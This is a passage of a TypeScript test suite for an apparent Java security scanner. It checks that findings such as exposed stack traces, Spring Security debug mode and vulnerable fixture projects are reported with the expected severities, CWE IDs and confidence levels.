      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserController.java": STACK_TRACE_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Stack trace exposed via printStackTrace()",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("MEDIUM");
      expect(finding!.cwe).toBe("CWE-209");
    });

    it("does not flag printStackTrace() in test files", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/test/java/UserServiceTest.java": STACK_TRACE_TEST_FILE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Stack trace exposed via printStackTrace()",
      );
      expect(finding).toBeUndefined();
    });

    it("does not flag proper logger.error() usage", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserController.java": STACK_TRACE_LOGGED,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Stack trace exposed via printStackTrace()",
      );
      expect(finding).toBeUndefined();
    });

    it("does not flag printStackTrace() in a catch block that only logs (no client leak)", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/BackgroundWorker.java": STACK_TRACE_LOG_ONLY,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Stack trace exposed via printStackTrace()",
      );
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 15: Spring Security debug ───────────────────────────────────────

  describe("scan() — Check 15: Spring Security debug mode", () => {
    it("detects @EnableWebSecurity(debug = true)", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": SECURITY_DEBUG_TRUE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Spring Security debug mode enabled");
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("HIGH");
      expect(finding!.cwe).toBe("CWE-215");
    });

    it("does not flag @EnableWebSecurity(debug = false)", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": SECURITY_DEBUG_FALSE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Spring Security debug mode enabled");
      expect(finding).toBeUndefined();
    });

    it("does not flag @EnableWebSecurity without debug argument", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": SECURITY_NO_DEBUG,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Spring Security debug mode enabled");
      expect(finding).toBeUndefined();
    });
  });

  // ── Result structure ───────────────────────────────────────────────────────

  describe("scan() — result structure", () => {
    const FULL_VULNERABLE_PROJECT = makeFiles({
      "pom.xml": POM_XML,
      "src/main/resources/application.properties": ACTUATOR_WILDCARD_PROPS,
      "src/main/java/Security.java": CSRF_DISABLED_V1,
      "src/main/java/HashUtil.java": WEAK_HASH_MD5,
      "src/main/java/DataProcessor.java": DESERIALIZATION_CODE,
    });

    it("every result has all required fields", async () => {
      const results = await agent.scan(FULL_VULNERABLE_PROJECT);
      expect(results.length).toBeGreaterThan(0);

      for (const result of results) {
        expect(result.title).toBeTruthy();
        expect(["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]).toContain(result.severity);
        expect(result.file).toBeTruthy();
        expect(result.line).toBeGreaterThan(0);
        expect(result.description).toBeTruthy();
        expect(result.fix).toBeTruthy();
      }
    });

    it("every result includes a confidence field", async () => {
      const results = await agent.scan(FULL_VULNERABLE_PROJECT);
      expect(results.length).toBeGreaterThan(0);

      for (const result of results) {
        expect(["high", "medium", "low"]).toContain(result.confidence);
      }
    });

    it("results include CWE references", async () => {
      const results = await agent.scan(FULL_VULNERABLE_PROJECT);
      const withCwe = results.filter((r) => r.cwe);
      expect(withCwe.length).toBeGreaterThan(0);
      for (const result of withCwe) {
        expect(result.cwe).toMatch(/^CWE-\d+$/);
      }
    });
  });

  // ── Project-level Spring Security detection ────────────────────────────────

  describe("scan() — project-level Spring Security detection", () => {
    it("downgrades permitAll confidence to 'low' when @EnableWebSecurity is present project-wide", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/GlobalSecurityConfig.java": SPRING_SECURITY_GLOBAL_CONFIG,
        "src/main/java/SecurityConfig.java": PERMIT_ALL_SENSITIVE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.checkId === "java:permit-all-sensitive");
      expect(finding).toBeDefined();
      expect(finding!.confidence).toBe("low");
    });

    it("downgrades @RequestMapping confidence to 'low' when @EnableWebSecurity is present project-wide", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/GlobalSecurityConfig.java": SPRING_SECURITY_GLOBAL_CONFIG,
        // Use a file WITHOUT @RestController+@Secured so the check fires
        "src/main/java/RequestController.java": REQUEST_MAPPING_NO_METHOD,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.checkId === "java:request-mapping-no-method");
      expect(finding).toBeDefined();
      expect(finding!.confidence).toBe("low");
    });
  });

  // ── Clean project ──────────────────────────────────────────────────────────

  describe("scan() — clean project", () => {
    it("returns zero findings for a project with no vulnerabilities", async () => {
      const cleanFiles = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.properties": [
          ACTUATOR_SAFE_PROPS,
          CREDENTIALS_ENV_REF_PROPS,
        ].join("\n"),
        "src/main/java/SecurityConfig.java": CSRF_ENABLED,
        "src/main/java/XmlParser.java": XXE_SAFE_CODE,
        "src/main/java/UserController.java": REQUEST_MAPPING_WITH_METHOD,
        "src/main/java/HashUtil.java": STRONG_HASH,
        "src/main/java/UserRepository.java": QUERY_SAFE_CODE,
        "src/main/java/DataProcessor.java": DESERIALIZATION_SAFE,
        "src/main/java/ApiController.java": CORS_RESTRICTED,
        "src/main/java/JwtTokenProvider.java": JWT_ENV_SECRET,
      });

      const results = await agent.scan(cleanFiles);
      expect(results).toHaveLength(0);
    });
  });
});

// ─── getChecks() ──────────────────────────────────────────────────────────────

describe("getChecks", () => {
  const checkAgent = new JavaScanAgent();

  it("returns non-empty array of check definitions", () => {
    expect(checkAgent.getChecks().length).toBeGreaterThan(0);
  });

  it("every check has required fields", () => {
    const validSeverities = new Set(["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]);

    for (const check of checkAgent.getChecks()) {
      expect(check.id).toBeTruthy();
      expect(check.name).toBeTruthy();
      expect(validSeverities.has(check.severity)).toBe(true);
    }
  });

  it("check IDs are unique", () => {
    const ids = checkAgent.getChecks().map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("check IDs follow java: prefix convention", () => {
    for (const check of checkAgent.getChecks()) {
      expect(check.id).toMatch(/^java:/);
    }
  });

  it("scan findings have checkIds matching declared checks", async () => {
    const declaredIds = new Set(checkAgent.getChecks().map((c) => c.id));

    const vulnerableFiles = makeFiles({
      "pom.xml": POM_XML,
      "src/main/resources/application.properties": ACTUATOR_WILDCARD_PROPS,
      "src/main/java/UserController.java": LOG4SHELL_CODE,
      "src/main/java/DataProcessor.java": DESERIALIZATION_CODE,
      "src/main/java/UserRepository.java": QUERY_INJECTION_CODE,
      "src/main/java/SecurityConfig.java": CSRF_DISABLED_V1,
      "src/main/java/XmlParser.java": XXE_CODE,
      "src/main/java/RequestController.java": REQUEST_MAPPING_NO_METHOD,
      "src/main/java/PermitConfig.java": PERMIT_ALL_SENSITIVE,
      "src/main/java/HashUtil.java": WEAK_HASH_MD5,
      "src/main/java/FileProcessor.java": COMMAND_INJECTION_CODE,
      "src/main/java/ApiController.java": CORS_WILDCARD_ANNOTATION,
      "src/main/java/JwtTokenProvider.java": JWT_HARDCODED_SECRET,
      "src/main/java/ErrorHandler.java": STACK_TRACE_CODE,
      "src/main/java/SecurityDebugConfig.java": SECURITY_DEBUG_TRUE,
    });

    const results = await checkAgent.scan(vulnerableFiles);
    expect(results.length).toBeGreaterThan(0);

    for (const result of results) {
      expect(result.checkId).toBeTruthy();
      expect(declaredIds.has(result.checkId!)).toBe(true);
    }
  });
});
